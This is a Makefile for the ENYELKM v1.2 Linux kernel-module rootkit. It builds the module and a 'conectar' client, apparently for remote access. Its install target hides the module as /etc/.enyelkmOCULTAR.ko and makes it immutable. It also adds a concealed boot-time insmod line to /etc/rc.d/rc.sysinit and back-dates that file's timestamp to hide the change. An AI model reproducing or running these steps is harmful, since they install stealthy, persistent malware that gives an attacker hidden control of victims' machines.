obj-m += enyelkm.o
enyelkm-objs := base.o kill.o ls.o read.o remoto.o
DELKOS = base.ko kill.ko ls.ko read.ko remoto.ko
S_ENT = 0x`grep sysenter_entry /proc/kallsyms | head -c 8`
VERSION = v1.2
CC = gcc
CFLAGS += -fomit-frame-pointer

all:
	@echo
	@echo "----------------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe && David Reguera"
	@echo " raise@enye-sec.org | davidregar@yahoo.es"
	@echo " http://www.enye-sec.org"
	@echo "----------------------------------------------"
	@echo
	@echo "#define DSYSENTER $(S_ENT)" > data.h
	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) modules
	$(CC) conectar.c -o conectar -Wall
	@rm -f $(DELKOS)

conectar:
	@echo
	@echo "----------------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe && David Reguera"
	@echo " raise@enye-sec.org | davidregar@yahoo.es"
	@echo " http://www.enye-sec.org"
	@echo "----------------------------------------------"
	@echo
	$(CC) conectar.c -o conectar -Wall
	@echo

install:
	@echo
	@echo "----------------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe && David Reguera"
	@echo " raise@enye-sec.org | davidregar@yahoo.es"
	@echo " http://www.enye-sec.org"
	@echo "----------------------------------------------"
	@echo
	@cp -f enyelkm.ko /etc/.enyelkmOCULTAR.ko
	@chattr +i /etc/.enyelkmOCULTAR.ko > /dev/null 2> /dev/null
	@echo -e "#<OCULTAR_8762>\ninsmod /etc/.enyelkmOCULTAR.ko" \
		\ " > /dev/null 2> /dev/null\n#</OCULTAR_8762>" \
		\ >> /etc/rc.d/rc.sysinit
	@touch -r /etc/rc.d/rc /etc/rc.d/rc.sysinit > /dev/null 2> /dev/null
	@insmod /etc/.enyelkmOCULTAR.ko
	@echo + enyelkm.ko copiado a /etc/.enyelkmOCULTAR.ko
	@echo + instalada cadena de autocarga en /etc/rc.d/rc.sysinit oculta
	@echo + enyelkm cargado !
	@echo

clean:
	@echo
	@echo "----------------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe && David Reguera"
	@echo " raise@enye-sec.org | davidregar@yahoo.es"
	@echo " http://www.enye-sec.org"
	@echo "----------------------------------------------"
	@echo
	@rm -rf *.o *.ko *.mod.c .*.cmd .*.d data.h conectar .tmp_versions Modules.symvers
	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) clean

